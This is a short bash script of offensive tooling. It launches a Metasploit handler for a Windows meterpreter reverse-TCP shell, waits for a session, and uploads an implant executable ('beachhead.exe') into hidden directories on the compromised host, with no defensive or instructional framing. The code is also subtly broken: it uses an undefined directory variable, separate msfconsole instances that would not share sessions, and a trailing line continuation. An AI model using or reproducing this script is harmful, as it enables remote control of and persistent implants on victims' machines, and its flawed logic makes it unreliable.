#!/bin/bash


# Set up the listener in Metasploit
msfconsole -q -x \
"use exploit/multi/handler; \
set PAYLOAD windows/meterpreter/reverse_tcp; \
set LHOST $(hostname -I | cut -d' ' -f1); \
set LPORT 4444; \
exploit;"

# Wait for a connection from the agent
echo "Waiting for connection..."
while ! msfconsole -q -x "sessions" | grep "meterpreter" > /dev/null; do
    sleep 1
done

# Connect to the agent session, install implant on hidden directories
SESSION_ID=$(msfconsole -q -x "sessions" | grep "meterpreter" | awk '{print $1}')
msfconsole -q -x "sessions -i $SESSION_ID -c \
upload /path/to/beachhead.exe $dir" \
